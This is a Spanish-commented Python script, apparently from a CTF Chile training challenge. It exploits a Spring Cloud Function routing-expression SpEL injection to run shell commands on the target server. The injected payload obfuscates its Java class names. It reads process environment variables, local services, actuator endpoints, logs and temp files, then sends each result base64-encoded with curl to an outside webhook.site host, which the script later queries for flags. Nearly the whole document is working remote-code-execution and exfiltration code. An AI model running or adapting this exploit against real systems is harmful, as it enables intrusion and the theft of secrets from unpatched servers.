#!/usr/bin/env python3
"""
CTF Chile - Exploración profunda del runtime y servicios locales
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32785"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook para exploración profunda...")
uuid_resp = requests.post("https://webhook.site/token", timeout=10)
UUID = uuid_resp.json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def deep_probe(cmd, tag):
    shell = f"({cmd}) | head -20 | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"[{r.status_code}] {tag}")
        return r.status_code == 500
    except Exception as e:
        print(f"[ERR] {tag}: {str(e)[:40]}...")
        return False

print(f"\n{'='*70}")
print("🕵️ EXPLORACIÓN PROFUNDA DEL RUNTIME")
print("🔍 Buscando 'la llave en lo más profundo'")
print(f"{'='*70}")

print(f"\n[1] VARIABLES DE ENTORNO DEL PROCESO JAVA")
deep_probe("cat /proc/1/environ | tr '\\0' '\\n'", "java_env_vars")
deep_probe("env | sort", "current_env")

print(f"\n[2] PROPIEDADES DEL SISTEMA JAVA")
# Intentar acceder a propiedades del sistema a través del proceso Java
deep_probe("jcmd 1 VM.system_properties 2>/dev/null || echo 'NO_JCMD'", "java_sys_props")
deep_probe("ls -la /proc/1/", "java_proc_info")

print(f"\n[3] SERVICIOS LOCALES OCULTOS")
deep_probe("netstat -tlnp | grep -v ':32785'", "hidden_services")
deep_probe("ss -tlnp | head -15", "socket_stats")

print(f"\n[4] PUERTOS LOCALES ESPECÍFICOS")
# Probar puertos comunes que podrían tener la aplicación
common_ports = [8080, 9090, 8081, 3000, 8090, 9000, 8888]
for port in common_ports[:4]:  # Limitar para no saturar
    deep_probe(f"curl -s -m 3 http://localhost:{port}/ | head -5", f"local_{port}")

print(f"\n[5] EXPLORAR ACTUATOR ENDPOINTS")
# Spring Boot Actuator endpoints que podrían revelar información
actuator_endpoints = [
    "actuator/env",
    "actuator/configprops",
    "actuator/mappings",
    "actuator/info",
    "actuator/health"
]
for endpoint in actuator_endpoints:
    deep_probe(f"curl -s http://localhost:8080/{endpoint} | head -5", f"actuator_{endpoint.split('/')[-1]}")

print(f"\n[6] BUSCAR EN ARCHIVOS DE LOG")
deep_probe("find /var/log -name '*.log' 2>/dev/null | head -5 | xargs tail -n 5 2>/dev/null", "log_files")
deep_probe("find /app -name '*.log' 2>/dev/null | xargs cat 2>/dev/null", "app_logs")

print(f"\n[7] MEMORIA Y ARCHIVOS TEMPORALES")
deep_probe("find /tmp /var/tmp -type f 2>/dev/null | head -10 | xargs ls -la 2>/dev/null", "temp_files")
deep_probe("ls -la /dev/shm/ 2>/dev/null", "shared_memory")

print(f"\n[8] BUSCAR FLAGS EN CONFIGURACIÓN RUNTIME")
deep_probe("ps aux | grep java | head -1", "java_cmdline")
deep_probe("cat /proc/1/cmdline | tr '\\0' '\\n'", "java_startup")

print(f"\n[9] PROBAR ENDPOINTS WEB DIRECTOS EN LA APLICACIÓN")
web_paths = [
    "",
    "admin",
    "api",
    "docs",
    "swagger",
    "flag",
    "vault",
    "omnivault"
]
for path in web_paths:
    if path:
        deep_probe(f"curl -s http://localhost:8080/{path} | grep -i ctfchile | head -1", f"web_{path}")
    else:
        deep_probe("curl -s http://localhost:8080/ | head -10", "web_root")

print(f"\n[10] BUSCAR EN ARCHIVOS DE CONFIGURACIÓN CREADOS DINÁMICAMENTE")
deep_probe("find /app -newer /app/app.jar 2>/dev/null", "newer_files")
deep_probe("lsof -p 1 | grep -E '(log|conf|prop|txt)' | head -10", "open_files")

print(f"\n⏰ Esperando resultados de la exploración profunda...")
time.sleep(15)

# Análisis de resultados
print(f"\n🔍 ANÁLISIS DE RESULTADOS PROFUNDOS...")
try:
    r = requests.get(f"https://webhook.site/token/{UUID}/requests", timeout=20)
    data = r.json().get("data", [])

    flags_found = []
    services_found = []
    env_vars = []
    interesting_content = []

    print(f"Total de requests capturadas: {len(data)}")

    for req in data[:25]:
        url = req.get("url", "")
        tag = url.split(UUID)[-1].split("?")[0].lstrip("/")
        query = req.get("query", {})
        raw_data = query.get("d", "")

        if isinstance(raw_data, list):
            raw_data = raw_data[0] if raw_data else ""

        if raw_data:
            try:
                decoded = base64.b64decode(raw_data).decode("utf-8", "replace")

                print(f"\n{'='*50}")
                print(f"📁 [{tag.upper()}]")
                print(f"{'='*50}")
                print(decoded[:400])
                if len(decoded) > 400:
                    print("...")

                # Detectar flags
                if "ctfchile{" in decoded.lower():
                    flags_found.append((tag, decoded))
                    print(f"\n🚩🚩🚩 FLAG ENCONTRADO EN {tag}! 🚩🚩🚩")

                # Clasificar contenido
                if tag.startswith("java_env") or tag == "current_env":
                    env_vars.append((tag, decoded))

                if "localhost" in decoded or "127.0.0.1" in decoded or "LISTEN" in decoded:
                    services_found.append((tag, decoded[:200]))

                if any(keyword in decoded.lower() for keyword in ["flag", "secret", "vault", "omnivault", "ctf"]):
                    interesting_content.append((tag, decoded[:300]))

            except Exception as e:
                print(f"\n[{tag}] (decode error): {raw_data[:100]}...")

    # Resumen final detallado
    print(f"\n{'='*70}")
    print(f"📊 RESUMEN COMPLETO DE EXPLORACIÓN PROFUNDA")
    print(f"{'='*70}")

    if flags_found:
        print(f"🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
        for tag, flag in flags_found:
            print(f"    🎯 {tag}: {flag}")
            print(f"    ✅ ¡MISIÓN DE INFILTRACIÓN COMPLETADA!")

    if services_found:
        print(f"\n🔍 SERVICIOS LOCALES ENCONTRADOS: {len(services_found)}")
        for tag, info in services_found:
            print(f"    - {tag}: {info[:100]}...")

    if env_vars:
        print(f"\n🌍 VARIABLES DE ENTORNO: {len(env_vars)}")
        for tag, vars_content in env_vars:
            print(f"    - {tag}: {len(vars_content)} caracteres de variables")

    if interesting_content:
        print(f"\n🔍 CONTENIDO RELEVANTE: {len(interesting_content)}")
        for tag, content in interesting_content[:5]:
            print(f"    - {tag}: {content[:150]}...")

    if not flags_found:
        print(f"\n💡 SIGUIENTE ESTRATEGIA:")
        print(f"   🔑 El flag puede requerir autenticación específica")
        print(f"   🏗️  Puede estar en un endpoint que requiere parámetros específicos")
        print(f"   🔐 Puede estar encriptado o codificado en la respuesta")
        print(f"   🌐 Puede requerir acceso a servicios externos específicos")

except Exception as e:
    print(f"[!] Error analizando resultados: {e}")

print(f"\n🔗 Webhook detallado: https://webhook.site/#!/{UUID}")
print(f"{'='*70}")